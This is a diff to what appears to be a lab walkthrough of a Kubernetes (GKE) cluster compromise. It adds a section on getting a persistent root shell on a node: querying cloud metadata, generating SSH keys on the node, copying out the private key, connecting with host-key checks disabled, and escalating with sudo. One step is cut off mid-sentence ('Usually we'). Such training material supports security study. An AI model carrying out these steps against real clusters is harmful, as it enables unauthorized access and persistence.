@@ -368,7 +368,7 @@ export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kuberne
 cat /etc/resolv.conf
 ```
 ```
-search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.manuel-development-3.internal c.manuel-development-3.internal google.internal
+search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.<username>-development-3.internal c.<username>-development-3.internal google.internal
 nameserver 10.228.0.10 #                 <----This is the line we need
 options ndots:5
 ```
@@ -422,7 +422,123 @@ uid=0(root) gid=0(root) groups=0(root)
 curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/hostname
 ```
 ```
-gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz.us-central1-f.c.manuel-development-3.internal
+gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz.us-central1-f.c.<username>-development-3.internal
+```
+
+## Gaining a full bash shell on the node
+
+**Confirming the hostname and IP address of the node**
+First we need to find out on which node we are operating.
+Which we can confirm by just asking for the hostname.
+
+```bash
+hostname
+```
+```
+gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj
+```
+
+We can then either directly from the node try to confirm our external IP address via curl.
+```bash
+curl http://ifconfig.me/
+```
+```
+35.226.180.169
+```
+
+Or, alternatively on the system from which we deployed the Terraform run:
+```bash
+gcloud compute instances list
+```
+```
+NAME                                                 ZONE           MACHINE_TYPE  PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP     STATUS
+gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj  us-central1-a  e2-medium                  10.10.10.3   35.226.180.169  RUNNING
+lunalectric-attacker-vm-9cqc                         us-central1-a  e2-medium                  10.10.11.2   34.30.213.12    RUNNING
+gke-lunalectric-gke--lunalectric-pool-66102390-zr4g  us-central1-c  e2-medium                  10.10.10.5   35.238.236.209  RUNNING
+gke-lunalectric-gke--lunalectric-pool-24ac192f-x1gh  us-central1-f  e2-medium                  10.10.10.4   34.136.208.72   RUNNING
+
+```
+
+**Generating a ssh-key on the node**
+Usually we
+
+Then we switch to the context of that user.
+```bash
+su <username>
+```
+
+Change to the user's `.ssh` directory
+```bash
+cd /home/<username>/.ssh
+```
+
+Then run the command to generate a new ssh_key for <username>, for which we do not need to enter a password:
+```bash
+ssh-keygen
+```
+```
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/<username>/.ssh/id_rsa):
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/<username>/.ssh/id_rsa
+Your public key has been saved in /home/<username>/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:jwu7j87FFn3n4facOuCkxomnqjrDvfTyTwKYkqseV0k <username>@gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj
+The key's randomart image is:
++---[RSA 3072]----+
+|                 |
+|                 |
+|     W           |
+| .o . .  .       |
+|Bo . .  S . . o  |
+|..  o  . + + + . |
+|o..o ...B * . .  |
+|.++o..oB B . . o.|
+|xo+oa=O=*    .o.o|
++----[SHA256]-----+
+```
+
+Now we can display the private key via `cat`:
+```
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+<snip>
+-----END OPENSSH PRIVATE KEY-----
+```
+
+We copy and paste this key to our local machine to the file `key_rsa.node` and now we can connect directly via `ssh` to the compromised node with the following command:
+
+```
+ssh -i key_rsa.node -o CheckHostIP=no -o StrictHostKeyChecking=no root@35.226.180.169
+```
+```
+Welcome to Kubernetes v1.23.16-gke.1400!
+
+You can find documentation for Kubernetes at:
+  http://docs.kubernetes.io/
+
+The source for this release can be found at:
+  /home/kubernetes/kubernetes-src.tar.gz
+Or you can download it at:
+  https://storage.googleapis.com/kubernetes-release-gke/release/v1.23.16-gke.1400/kubernetes-src.tar.gz
+
+It is based on the Kubernetes source at:
+  https://github.com/kubernetes/kubernetes/tree/v1.23.16-gke.1400
+
+For Kubernetes copyright and licensing information, see:
+  /home/kubernetes/LICENSES
+```
+
+And we get `root` with a simple sudo:
+```
+<username>@gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj ~ $ sudo su
+```
+```
+gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj /home/<username> # id
+```
+```
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video),1001(chronos-access)
 ```
 
 
